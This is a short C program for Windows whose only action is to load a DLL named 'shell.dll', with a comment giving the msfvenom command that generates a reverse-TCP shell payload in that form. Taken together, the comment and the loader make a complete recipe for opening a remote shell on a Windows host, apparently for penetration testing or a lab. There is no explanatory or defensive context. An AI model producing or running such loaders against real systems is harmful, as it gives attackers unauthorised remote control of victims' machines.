#include <windows.h>
#include <stdio.h>

int main(int argc, char const *argv[])
{
    //msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll
    
    LoadLibrary("shell.dll");
    return 0;
}